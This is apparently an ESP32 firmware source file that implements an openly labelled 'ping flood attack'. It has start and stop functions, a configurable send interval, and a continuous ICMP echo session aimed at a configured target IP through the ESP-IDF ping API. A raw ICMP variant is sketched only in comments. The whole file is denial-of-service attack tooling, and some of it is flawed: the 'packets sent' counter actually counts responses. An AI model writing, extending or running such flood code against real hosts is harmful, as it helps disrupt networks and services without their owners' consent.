#include "config.h"
#include "types.h"
#include <esp_ping.h>

// PING FLOOD ATTACK IMPLEMENTATION

static bool ping_attack_active = false;
static uint32_t ping_packets_sent = 0;
static uint16_t ping_interval_ms = DEFAULT_PING_INTERVAL_MS;
static char ping_target[16] = TARGET_IP;

// Ping session handle
static esp_ping_handle_t ping_handle = NULL;

// Forward declaration
static void ping_initiate(const char* target_ip, uint16_t interval_ms);

// Start ping flood attack
void pingFloodStart(uint16_t interval_ms) {
    if (ping_attack_active) {
        Serial.println("[PING] Attack already active!");
        return;
    }
    
    // Use provided interval or default
    if (interval_ms > 0) {
        ping_interval_ms = interval_ms;
    } else {
        ping_interval_ms = DEFAULT_PING_INTERVAL_MS;
    }
    
    // Copy target from config or use default
    strncpy(ping_target, configGetTargetIP(), sizeof(ping_target) - 1);
    
    ping_attack_active = true;
    ping_packets_sent = 0;
    
    Serial.printf("[PING] Starting attack to %s at %d ms interval\n", 
                  ping_target, ping_interval_ms);
    
    // Start ping session
    ping_initiate(ping_target, ping_interval_ms);
}

// Stop ping flood attack
void pingFloodStop() {
    if (!ping_attack_active) {
        return;
    }
    
    ping_attack_active = false;
    
    if (ping_handle) {
        esp_ping_stop(ping_handle);
        ping_handle = NULL;
    }
    
    Serial.printf("[PING] Attack stopped. Total packets: %u\n", ping_packets_sent);
}

// Get current attack state
bool pingFloodIsActive() {
    return ping_attack_active;
}

// Get packet count
uint32_t pingFloodGetPacketCount() {
    return ping_packets_sent;
}

// ESP-IDF PING IMPLEMENTATION

// Ping callback - called for each response
static void on_ping_response(esp_ping_handle_t hdl, void *args) {
    uint32_t seqno;
    esp_ping_get_response_data(hdl, &seqno, NULL, NULL);
    ping_packets_sent++;
    
    if (DEBUG_MODE) {
        Serial.printf("[PING] Response #%u received\n", seqno);
    }
}

// Ping timeout callback
static void on_ping_timeout(esp_ping_handle_t hdl, void *args) {
    uint32_t seqno;
    esp_ping_get_response_data(hdl, &seqno, NULL, NULL);
    
    if (DEBUG_MODE) {
        Serial.printf("[PING] Request #%u timed out\n", seqno);
    }
}

// Start the ping session
static void ping_initiate(const char* target_ip, uint16_t interval_ms) {
    // Convert string IP to ip_addr_t
    ip_addr_t target_addr;
    target_addr.type = IPADDR_TYPE_V4;
    inet_pton(AF_INET, target_ip, &target_addr.u_addr.ip4);
    
    // Configure ping session
    esp_ping_config_t config = ESP_PING_DEFAULT_CONFIG();
    config.target_addr = target_addr;
    config.count = 0;           // Infinite (we'll stop manually)
    config.interval_ms = interval_ms;
    config.timeout_ms = 1000;   // 1 second timeout
    config.data_size = 64;      // Standard ping payload size
    
    // Set up callbacks
    esp_ping_callbacks_t cbs = {
        .on_ping_success = on_ping_response,
        .on_ping_timeout = on_ping_timeout,
        .on_ping_end = NULL  // We handle stop manually
    };
    
    // Create and start ping session
    esp_ping_new_session(&config, &cbs, &ping_handle);
    esp_ping_start(ping_handle);
    
    Serial.printf("[PING] Ping session started to %s\n", target_ip);
}

// ALTERNATIVE: Raw ICMP (if ESP-IDF ping not available)

#ifdef USE_RAW_ICMP

// For raw ICMP, you would need to:
// 1. Enable CONFIG_LWIP_RAW in sdkconfig
// 2. Use raw sockets directly

void sendRawICMP(const char* dest_ip) {
    // Allocate buffer for packet
    // Construct Ethernet header
    // Construct IP header (protocol = ICMP)
    // Construct ICMP Echo Request (type=8, code=0)
    // Add timestamp payload for identification
    // Send via raw socket
    
    ping_packets_sent++;
}

#endif // USE_RAW_ICMP
